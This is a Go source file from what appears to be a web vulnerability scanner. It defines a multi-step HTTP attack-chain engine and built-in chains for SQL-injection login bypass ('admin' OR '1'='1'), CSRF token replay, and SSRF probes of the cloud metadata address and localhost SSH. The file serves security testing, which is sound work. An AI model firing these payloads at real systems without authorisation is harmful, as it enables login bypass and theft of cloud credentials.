package engine

import (
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/SentinelXofficial/sxel/internal/output"
	"github.com/SentinelXofficial/sxel/pkg/core"
)

// ChainStep represents one step in a multi-step attack chain.
type ChainStep struct {
	Name       string            // human-readable step name
	Method     string            // HTTP method
	URL        string            // target URL (supports {{variable}})
	Headers    map[string]string // extra headers
	Body       string            // request body (supports {{variable}})
	Extract    []Extractor       // values to extract from response
	OnMatch    []string          // step names to execute if match succeeds
	OnFail     []string          // step names to execute if match fails
	MatchWords []string          // words that must be present in response
	MatchStatus []int            // expected status codes
}

// Extractor extracts a value from an HTTP response.
type Extractor struct {
	Name    string // variable name (e.g., "csrf", "token", "session")
	Type    string // "regex", "header", "cookie", "json"
	Pattern string // regex pattern, header name, cookie name, or JSON path
	Group   int    // regex capture group (default 1)
}

// Chain is a multi-step attack sequence.
type Chain struct {
	Name  string
	Steps map[string]*ChainStep
	Vars  map[string]string // extracted variables shared across steps
}

// NewChain creates a new attack chain with a starting step.
func NewChain(name string) *Chain {
	return &Chain{
		Name:  name,
		Steps: make(map[string]*ChainStep),
		Vars:  make(map[string]string),
	}
}

// AddStep adds a step to the chain.
func (c *Chain) AddStep(s ChainStep) {
	c.Steps[s.Name] = &s
}

// Run executes the chain starting from a named step.
func (c *Chain) Run(client *http.Client, cfg *core.Config, startStep string) []core.ScanResult {
	var results []core.ScanResult
	c.runStep(client, cfg, startStep, &results, make(map[string]bool))
	return results
}

func (c *Chain) runStep(client *http.Client, cfg *core.Config, name string, results *[]core.ScanResult, visited map[string]bool) {
	if visited[name] {
		return
	}
	visited[name] = true

	step, ok := c.Steps[name]
	if !ok {
		return
	}

	// Expand variables in URL and body
	reqURL := c.expandVars(step.URL)
	reqBody := c.expandVars(step.Body)

	req, err := http.NewRequest(step.Method, reqURL, strings.NewReader(reqBody))
	if err != nil {
		return
	}
	core.ApplyHeaders(req, cfg)
	for k, v := range step.Headers {
		req.Header.Set(k, c.expandVars(v))
	}

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	body := core.ReadBody(resp.Body)
	resp.Body.Close()

	// Extract variables from response
	for _, ext := range step.Extract {
		val := extractValue(ext, body, resp)
		if val != "" {
			c.Vars[ext.Name] = val
			if cfg.Verbose {
				output.Verbose("[chain] %s: extracted %s = %q", c.Name, ext.Name, val[:min(40, len(val))])
			}
		}
	}

	// Check if step matched
	matched := c.checkMatch(step, body, resp)

	if matched {
		// Look for vulnerability indicators across the chain
		if len(step.MatchWords) > 0 || len(step.MatchStatus) > 0 {
			*results = append(*results, core.ScanResult{
				Type:      fmt.Sprintf("Chain: %s → %s", c.Name, step.Name),
				URL:       reqURL,
				Method:    step.Method,
				Parameter: "chain",
				Payload:   c.Name,
				Severity:  "HIGH",
				Evidence:  fmt.Sprintf("Step %q in chain %q matched — multi-step attack confirmed", step.Name, c.Name),
				Timestamp: time.Now(),
			})
			output.VulnInline("CHAIN", "%s → %s matched", c.Name, step.Name)
		}
		for _, next := range step.OnMatch {
			c.runStep(client, cfg, next, results, visited)
		}
	} else {
		for _, next := range step.OnFail {
			c.runStep(client, cfg, next, results, visited)
		}
	}
}

func (c *Chain) expandVars(s string) string {
	for k, v := range c.Vars {
		s = strings.ReplaceAll(s, "{{"+k+"}}", v)
	}
	return s
}

func (c *Chain) checkMatch(s *ChainStep, body string, resp *http.Response) bool {
	if len(s.MatchStatus) > 0 {
		for _, expected := range s.MatchStatus {
			if resp.StatusCode == expected {
				return true
			}
		}
		return false
	}
	if len(s.MatchWords) > 0 {
		for _, w := range s.MatchWords {
			if strings.Contains(strings.ToLower(body), strings.ToLower(w)) {
				return true
			}
		}
		return false
	}
	return true // no matchers = always continue
}

func extractValue(ext Extractor, body string, resp *http.Response) string {
	switch ext.Type {
	case "regex":
		re, err := regexp.Compile(ext.Pattern)
		if err != nil {
			return ""
		}
		m := re.FindStringSubmatch(body)
		group := ext.Group
		if group == 0 {
			group = 1
		}
		if len(m) > group {
			return m[group]
		}
	case "header":
		return resp.Header.Get(ext.Pattern)
	case "cookie":
		for _, c := range resp.Cookies() {
			if c.Name == ext.Pattern {
				return c.Value
			}
		}
	case "json":
		// Simple JSON path: just find the key in raw body
		pat := fmt.Sprintf(`"%s"\s*:\s*"([^"]+)"`, regexp.QuoteMeta(ext.Pattern))
		re, err := regexp.Compile(pat)
		if err != nil {
			return ""
		}
		m := re.FindStringSubmatch(body)
		if len(m) > 1 {
			return m[1]
		}
	}
	return ""
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// ── Built-in Chains ─────────────────────────────────────────────────────────

// ChainLoginBypass tests for SQL injection in login forms leading to bypass.
func ChainLoginBypass(client *http.Client, cfg *core.Config, loginURL string) []core.ScanResult {
	chain := NewChain("LoginBypass")
	chain.AddStep(ChainStep{
		Name:       "get_form",
		Method:     "GET",
		URL:        loginURL,
		Extract:    []Extractor{{Name: "csrf", Type: "regex", Pattern: `name="csrf[^"]*"\s+value="([^"]+)"`}},
		OnMatch:    []string{"inject_sqli"},
	})
	chain.AddStep(ChainStep{
		Name: "inject_sqli",
		Method: "POST",
		URL:   loginURL,
		Headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
		Body:      "user=admin' OR '1'='1&pass=test&csrf={{csrf}}",
		MatchWords: []string{"welcome", "dashboard", "logout", "admin"},
		MatchStatus: []int{200, 302},
	})
	return chain.Run(client, cfg, "get_form")
}

// ChainCSRFExploit tests CSRF by extracting token and replaying without it.
func ChainCSRFExploit(client *http.Client, cfg *core.Config, formURL string) []core.ScanResult {
	chain := NewChain("CSRFExploit")
	chain.AddStep(ChainStep{
		Name:       "extract_token",
		Method:     "GET",
		URL:        formURL,
		Extract:    []Extractor{{Name: "csrf", Type: "regex", Pattern: `name="_token"\s+value="([^"]+)"`}},
		OnMatch:    []string{"replay_without_token"},
	})
	chain.AddStep(ChainStep{
		Name:        "replay_without_token",
		Method:      "POST",
		URL:         formURL,
		Headers:     map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
		Body:        "name=test&email=test@test.com&_token=INVALID",
		MatchWords:  []string{"success", "saved", "updated"},
	})
	return chain.Run(client, cfg, "extract_token")
}

// ChainSSRFProbe tests SSRF via URL parameter chains.
func ChainSSRFProbe(client *http.Client, cfg *core.Config, baseURL string, param string) []core.ScanResult {
	parsed, _ := url.Parse(baseURL)
	chain := NewChain("SSRFProbe")
	chain.Vars["base"] = fmt.Sprintf("%s://%s", parsed.Scheme, parsed.Host)
	chain.Vars["param"] = param

	chain.AddStep(ChainStep{
		Name:    "probe_aws",
		Method:  "GET",
		URL:     "{{base}}?{{param}}=http://169.254.169.254/latest/meta-data/",
		MatchWords: []string{"ami-id", "instance-id", "security-credentials"},
		OnFail:  []string{"probe_localhost"},
	})
	chain.AddStep(ChainStep{
		Name:    "probe_localhost",
		Method:  "GET",
		URL:     "{{base}}?{{param}}=http://127.0.0.1:22/",
		MatchWords: []string{"SSH", "OpenSSH", "protocol mismatch"},
	})
	return chain.Run(client, cfg, "probe_aws")
}
